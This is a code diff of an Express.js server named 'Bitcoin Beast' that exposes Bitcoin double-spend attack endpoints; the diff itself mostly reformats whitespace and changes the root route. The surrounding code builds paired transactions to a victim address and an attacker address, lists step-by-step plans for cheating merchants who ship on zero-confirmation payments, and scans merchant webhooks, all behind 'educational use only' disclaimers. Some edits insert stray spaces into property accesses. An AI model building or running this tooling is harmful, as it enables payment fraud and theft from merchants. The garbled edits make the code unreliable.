@@ -57,15 +57,18 @@ app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 app.set('trust proxy', true);
 
-// ======== STATIC FILE SERVING ========
-app.use(express.static(path.join(__dirname, 'public'), {
-  maxAge: '1h',
-  etag: false,
-}));
-
-// Serve index.html for root path
+// ======== ROOT ENDPOINT (API ONLY) ========
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.status(200).json({
+    status: 'OK',
+    message: 'Bitcoin Beast Backend is running 🚀',
+    version:  '1.0.0',
+    endpoints: {
+      api_docs: '/api-docs',
+      health:  '/health',
+      swagger_spec: '/swagger-spec.json',
+    }
+  });
 });
 
 // ======== NETWORK & API CONFIGURATION ========
@@ -86,9 +89,9 @@ const getSwaggerSpec = () => {
     : 'http://localhost:3000';
 
   return {
-    openapi: '3.0.0',
+    openapi:  '3.0.0',
     info: {
-      title: 'Bitcoin Beast Framework API',
+      title:  'Bitcoin Beast Framework API',
       version: '1.0.0',
       description: 'Testnet/mainnet double-spend testing, fee attack simulation, merchant 0-conf risk assessment.  For DEFENSIVE and EDUCATIONAL USE ONLY.',
       contact: { name: 'sweetpie2929' },
@@ -108,7 +111,7 @@ const getSwaggerSpec = () => {
       '/api/wallet/utxos': { get: { summary: 'Get UTXOs', tags: ['Wallet'] }},
       '/api/wallet/mempool': { get: { summary:  'Get mempool transactions', tags: ['Wallet'] }},
       '/api/generate-wallet': { post: { summary: 'Generate new wallet', tags: ['Wallet'] }},
-      '/api/create-opreturn-tx': { post: { summary: 'Create OP_RETURN transaction', tags:  ['Transactions'] }},
+      '/api/create-opreturn-tx': { post: { summary: 'Create OP_RETURN transaction', tags: ['Transactions'] }},
     }
   };
 };
@@ -177,7 +180,7 @@ app.post('/api/final-sequence-attack', (req, res) => {
     const tx1_fee = Math.ceil(150 * fee_rate);
     const psbt1 = new bitcoin. Psbt({ network:  net })
       .addInput({
-        hash: utxo. txid,
+        hash: utxo.txid,
         index: utxo.vout,
         sequence: 0xffffffff,
         witnessUtxo: {
@@ -211,12 +214,12 @@ app.post('/api/final-sequence-attack', (req, res) => {
         txid: tx1.getId(),
         hex: tx1.toHex(),
         destination: victim_address,
-        sequence:  '0xffffffff (won\'t opt-in to RBF)',
+        sequence: '0xffffffff (won\'t opt-in to RBF)',
         fee: tx1_fee,
         broadcast_target: 'merchant_nodes',
       },
       tx_attacker: {
-        txid:  tx2.getId(),
+        txid: tx2.getId(),
         hex: tx2.toHex(),
         destination: attacker_address,
         sequence: '0xfffffffe (RBF enabled)',
@@ -229,7 +232,7 @@ app.post('/api/final-sequence-attack', (req, res) => {
         'Broadcast new TX (RBF), higher fee > wins mempool > miners confirm.',
         'TX1 appears in mempool but is replaced, so merchant cheated.',
       ],
-      merchant_belief: 'Payment received (TX1 in mempool)',
+      merchant_belief:  'Payment received (TX1 in mempool)',
       reality:  'TX2 confirms, TX1 orphaned.',
     });
   } catch (error) {
@@ -248,7 +251,7 @@ app.post('/api/smart-fee-booster', async (req, res) => {
     const current_fees = {
       fastest: fees.fastestFee,
       half_hour: fees.halfHourFee,
-      hour: fees.hourFee,
+      hour: fees. hourFee,
     };
     const smart_fee = Math.max(current_fees. fastest * 1.2, target_fee_rate);
 
@@ -312,7 +315,7 @@ app.post('/api/merchant-targeted-broadcast', async (req, res) => {
     }
 
     res.json({
-      attack_type:  'MERCHANT_TARGETED_BROADCAST',
+      attack_type: 'MERCHANT_TARGETED_BROADCAST',
       broadcast_results: results,
       broadcast_settings: {
         delay_ms: 500,
@@ -429,7 +432,7 @@ app.post('/api/identical-inputs-exploit', (req, res) => {
           shared_txid: utxo.txid, shared_vout: utxo.vout, shared_value: utxo.value
         },
         tx_merchant: {
-          txid: tx1.getId(), hex: tx1.toHex(), output: merchant_address, fee:  3000
+          txid: tx1.getId(), hex: tx1.toHex(), output: merchant_address, fee: 3000
         },
         tx_attacker: {
           txid: tx2.getId(), hex: tx2.toHex(), output: attacker_address, fee: 5000
@@ -464,7 +467,7 @@ app.post('/api/time-window-exploit', (req, res) => {
       exploit_conditions: [
         'Merchant accepts 0-conf and auto-fulfills.',
         'Merchant does not double-spend check.',
-        `Fulfillment is instant (digital/dropship), no further checks. `
+        'Fulfillment is instant (digital/dropship), no further checks.'
       ],
       vulnerability: 'Merchant ships product on 0-conf, giving attacker time window.',
     });
@@ -482,9 +485,9 @@ app.post('/api/webhook-vulnerability-scanner', async (req, res) => {
     }
 
     const webhook_payloads = [
-      { name: 'mempool_detection', payload: { txid: test_payload_txid, confirmations: 0, status: 'unconfirmed' }, risk:  'Accepts 0-conf' },
+      { name: 'mempool_detection', payload: { txid: test_payload_txid, confirmations: 0, status: 'unconfirmed' }, risk: 'Accepts 0-conf' },
       { name: 'first_confirmation', payload: { txid: test_payload_txid, confirmations: 1, status: 'confirmed' }, risk: 'No re-org check' },
-      { name: 'address_balance_change', payload: { address: 'test_address', balance_change: 10000, confirmations: 0 }, risk:  'Counts unconfirmed in balance' },
+      { name: 'address_balance_change', payload: { address: 'test_address', balance_change: 10000, confirmations: 0 }, risk: 'Counts unconfirmed in balance' },
     ];
 
     res.json({
@@ -541,7 +544,7 @@ app.post('/api/execute-full-attack', async (req, res) => {
         index: utxo.vout,
         sequence: 0xffffffff,
         witnessUtxo: {
-          script:  bitcoin.address.toOutputScript(merchant_address, net),
+          script: bitcoin.address.toOutputScript(merchant_address, net),
           value: utxo.value,
         },
       })
@@ -581,7 +584,7 @@ app.post('/api/execute-full-attack', async (req, res) => {
         'Step 1: Broadcast TX1 to merchant monitors.',
         'Step 2: Wait for webhook acknowledgment (~2 seconds).',
         'Step 3: Check merchant fulfillment status.',
-        `Step 4: After window, broadcast TX2 (to miners).`,
+        'Step 4: After window, broadcast TX2 (to miners).',
         'Step 5: Monitor for double-spend confirmation.',
       ],
       expected:  'Attack will succeed if merchant ships on trust of 0-conf.',
@@ -643,7 +646,7 @@ app.use((err, req, res, next) => {
   };
 
   // Only include stack trace in development
-  if (process.env.NODE_ENV !== 'production') {
+  if (process.env. NODE_ENV !== 'production') {
     errorResponse.stack = err.stack;
   }
 
@@ -651,7 +654,7 @@ app.use((err, req, res, next) => {
 });
 
 // ===== SERVER INITIALIZATION =====
-const PORT = process. env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 const server = app.listen(PORT, () => {
@@ -662,9 +665,9 @@ const server = app.listen(PORT, () => {
 ║                                                            ║
 ║  ✓ Server running on port ${PORT}                           ║
 ║  ✓ Environment: ${NODE_ENV. toUpperCase()}                          ║
-║  ✓ Frontend: http://localhost:${PORT}                        ║
+║  ✓ Root:  http://localhost:${PORT}                            ║
 ║  ✓ API Docs: http://localhost:${PORT}/api-docs              ║
-║  ✓ Health:  http://localhost:${PORT}/health                  ║
+║  ✓ Health:  http://localhost:${PORT}/health                   ║
 ║                                                            ║
 ║  ⚠️  FOR EDUCATIONAL/DEFENSIVE USE ONLY                    ║
 ║  ⚠️  DO NOT ATTACK UNAUTHORIZED PARTIES                    ║
